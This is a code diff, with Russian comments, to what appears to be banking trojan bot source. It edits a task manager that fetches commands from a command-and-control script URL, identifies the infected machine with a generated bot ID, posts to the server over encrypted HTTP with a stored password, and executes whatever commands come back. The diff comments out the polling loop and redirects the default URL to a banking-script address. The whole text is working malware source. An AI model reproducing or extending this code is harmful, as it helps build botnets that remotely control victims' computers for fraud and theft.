@@ -286,46 +286,46 @@ bool TaskManagerSleep(PTaskManager Manager)
 
 //----------------------------------------------------------------------------
 
-bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
-{
-	/*   Запускаем цикл обработки команд  */
-
-	// Инициализируем менеджер выполнения команд
-	PTASKMANAGER M;
-	if (Manager != NULL)
-		M = (PTASKMANAGER)Manager;
-	else
-		M = (PTASKMANAGER)GetGlobalTaskManager(true);
-
-
-	// Регистрируем известные команды
-	if (InitCommands)
-		RegisterAllCommands(M, COMMAND_ALL);
-
-	PCHAR RealURL = URL;
-	bool SelfURL = URL == NULL;
-	
-	// Запускаем цикл обработки
-	do
-	{
-		if (SelfURL)
-			RealURL = GetBotScriptURL(SCRIPT_TASK);
-
-		// Загружаем и выполняем команду
-		if (RealURL != NULL)
-			DownloadAndExecuteCommand(M, RealURL);
-
-		if (SelfURL)
-			STR::Free(RealURL);
-		// Спим до выполнения следующей команды
-		if (!M->Terminated)
-	        TaskManagerSleep(M);
-
-
-	}
-	while (!M->Terminated);
-	return true;
-}
+//bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
+//{
+//	/*   Запускаем цикл обработки команд  */
+//
+//	// Инициализируем менеджер выполнения команд
+//	PTASKMANAGER M;
+//	if (Manager != NULL)
+//		M = (PTASKMANAGER)Manager;
+//	else
+//		M = (PTASKMANAGER)GetGlobalTaskManager(true);
+//
+//
+//	// Регистрируем известные команды
+//	if (InitCommands)
+//		RegisterAllCommands(M, COMMAND_ALL);
+//
+//	PCHAR RealURL = URL;
+//	bool SelfURL = URL == NULL;
+//
+//	// Запускаем цикл обработки
+//	do
+//	{
+//		if (SelfURL)
+//			RealURL = GetBotScriptURL(SCRIPT_TASK);
+//
+//		// Загружаем и выполняем команду
+//		if (RealURL != NULL)
+//			DownloadAndExecuteCommand(M, RealURL);
+//
+//		if (SelfURL)
+//			STR::Free(RealURL);
+//		// Спим до выполнения следующей команды
+//		if (!M->Terminated)
+//	        TaskManagerSleep(M);
+//
+//
+//	}
+//	while (!M->Terminated);
+//	return true;
+//}
 
 //----------------------------------------------------------------------------
 
@@ -359,13 +359,11 @@ void StopTaskManager(PTaskManager Manager)
 }
 //----------------------------------------------------------------------------
 
-bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
+bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
 {
 	// Загрузить команду/ набор команд
 
-	bool FreeURL = STR::IsEmpty(URL);
-	if (FreeURL)
-    	URL = GetBotScriptURL(SCRIPT_TASK);
+	string URL = (!STR::IsEmpty(aURL)) ? string(aURL) : GetBankingScriptURL(SCRIPT_TASK, true);
 
 	string BotID = GenerateBotID2(GetPrefix(true));
 
@@ -379,7 +377,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 
 	#ifdef CryptHTTPH
 		PCHAR Password = GetMainPassword();
-		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
+		bool Result = CryptHTTP::Post(URL.t_str(), Password, Fields, HTMLCode, &Response);
         STR::Free(Password);
 	#else
     	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
@@ -405,9 +403,6 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
     HTTPResponse::Clear(&Response);
 	Strings::Free(Fields);
 
-	if (FreeURL)
-    	STR::Free(URL);
-
     return Result;
 }
 //----------------------------------------------------------------------------
@@ -415,13 +410,6 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 {
 	// Загрузить и выполнить команду
-	bool FreeURL = STR::IsEmpty(URL);
-
-	if (FreeURL)
-		URL = GetBotScriptURL(SCRIPT_TASK);
-
-	if (URL == NULL)
-		return false;
 
 	PTASKMANAGER M;
 	if (Manager != NULL)
@@ -442,9 +430,6 @@ bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 			STR::Free(Command);
 		}
 	}
-
-	if (FreeURL)
-    	STR::Free(URL);
 
     return Result;
 }
